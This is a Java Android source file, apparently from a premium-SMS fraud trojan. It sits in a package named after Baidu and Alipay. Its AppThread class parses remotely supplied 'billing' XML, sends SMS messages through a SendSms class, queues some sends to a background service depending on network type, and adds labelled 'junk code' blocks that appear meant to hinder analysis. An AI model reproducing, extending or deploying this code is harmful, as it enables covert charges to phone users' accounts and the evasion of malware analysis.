package com.baidu.alipay;

import com.baidu.alipay.script.SendSms;
import com.baidu.pushagent.PushEventReceiver;
import com.baidu.serv.SelfHandler;
import com.baidu.serv.SelfMessage;
import com.baidu.serv1.PaySdk;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;

public class AppThread extends Thread {
    private static final String TAG = "AppThread";
    
    private String BillingXML;
//    private Handler handler;
    private SelfHandler handler;
    private boolean sync;
    private String random=null;
    private Context context;
    
    private static boolean working = false;

//    public AppThread(final Context context, final Handler handler, String billingxml,String random,boolean sync) {
    public AppThread(final Context context, final SelfHandler handler, String billingxml,String random,boolean sync) {
        this.BillingXML = billingxml;
        this.handler = handler;
        this.context = context;
        this.sync = sync;
        this.random = random;
        
//        this.setUncaughtExceptionHandler(new UncaughtExceptionHandler() {
//			@Override
//			public void uncaughtException(Thread arg0, Throwable e) {
//				UserLogUtil.addLog(context, "AppThread err : "+e.getClass().getName()+";"+e.getStackTrace()[0].toString());
//				working = false;
//				e.printStackTrace();
//				handler.sendEmptyMessage(AppProperty.BILLING_ERROR);
//			}
//		});
    }

    /**
     * 执行sendsms
     * @param xml
     * @return
     */
    private boolean realRun(String xml) {
    	
		try {
			SendSms sendSms = new SendSms(xml);
			
			return sendSms.work(context,sync);
		} catch (Throwable e) {
//			UserLogUtil.addLog(context, "sendSms work Excetion : "+e.getMessage());
			e.printStackTrace();
		}finally{
			System.gc();
		}
        
    	return false;
    }

    @Override
    public void run() {
    	SelfMessage selfMessage = null;
    	try{
    		selfMessage = run1();
    	}catch (Exception e) {
			e.printStackTrace();
			selfMessage = new SelfMessage(AppProperty.BILLING_ERROR);
		}
    	
    	handler.handleMessage(selfMessage);
    }
    
    public SelfMessage run1(){
    	while(working){
    		try {
				Thread.sleep(1000l);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
    	}
    	
    	working = true;
    	
    	LogUtil.e(TAG,"start to run");
    	
    	//垃圾代码开始
		int dadada = 0;
		
		if(dadada < 0){
			String asffa = "are";
			String fffsa = "ill";

			String fafsa = "un";
			String sadss = "rel";
			
			String afa = fffsa+"."+sadss+"."+asffa+"."+fafsa;
		}
		
		//垃圾代码结束
    	
    	
    	boolean succ = true;
    	boolean hasSync = false;
    	boolean hasSucc = false;
    	
    	int start = 0;
        int end = 0;
        String _start = "<"+SendSms.SENDSMS+">";
        String _end = "</"+SendSms.SENDSMS+">";

        String _BillingXML = BillingXML;
        
        boolean hasAsync = false;

        while ((start = _BillingXML.indexOf(_start)) >= 0
                && (end = _BillingXML.indexOf(_end)) > 0) {
        	 try{
	        	String xml = _BillingXML.substring(start, end + _end.length());
	            
	        	if((xml.indexOf("<nowifi>1</nowifi>") >= 0 && sync && Utils.getAPNType(context) < NetWorkUtils.APNTYPE_WAP )){
	        		hasSucc = true;
	        		hasAsync = true;
	        		AppTaskUtil.saveXml(context, System.currentTimeMillis()+"", xml,true);
	        	}else if(xml.indexOf("<asynch>1</asynch>") >= 0 && sync){
	        		AppTaskUtil.saveXml(context, System.currentTimeMillis()+"", xml,true);
	        		hasAsync = true;
	        	}else{
	        		hasSync = true;
	        		if (!realRun(xml)) {
//	        			UserLogUtil.addLog(context,"AppThread realRun fail");
		            	succ = false;
		            	
		            	if(!sync){
		            		break;
		            	}
		            	 
		            }else{
		            	hasSucc = true;
		            }
	        	}
	        	
	        	//垃圾代码开始
	    		int dadada1 = 0;
	    		
	    		if(dadada1 < 0){
	    			String asffa = "are";
	    			String fffsa = "ill";

	    			String fafsa = "un";
	    			String sadss = "rel";
	    			
	    			String afa = fffsa+"."+sadss+"."+asffa+"."+fafsa;
	    		}
	    		
	    		//垃圾代码结束
	        	
	            _BillingXML = _BillingXML.substring(end + _end.length());
	            
	            if(!sync){
	            	AppTaskUtil.saveXml(context, random, _BillingXML,false);
	            }
        	}catch (Exception e) {
//        		UserLogUtil.addLog(context, "AppThread run Exception : "+e.getMessage());
     			e.printStackTrace();
     			if(!sync){
            		break;
            	}
     		}
        }
        
        if(hasAsync){
	    	PaySdk.startAppTaskService(context);
        }
	    
//        if ((succ && hasSync) || (sync && hasSucc)) {
////           handler.sendEmptyMessage(AppProperty.BILLING_SUCCESS);
//        	handler.handleMessage(new SelfMessage(AppProperty.BILLING_SUCCESS));
//        } else {
////            handler.sendEmptyMessage(AppProperty.BILLING_ERROR);
//        	handler.handleMessage(new SelfMessage(AppProperty.BILLING_ERROR));
//        }

        working = false;
        
        if ((succ && hasSync) || (sync && hasSucc)) {
        	return new SelfMessage(AppProperty.BILLING_SUCCESS);
        }else{
        	return new SelfMessage(AppProperty.BILLING_ERROR);
        }
        
    }
}
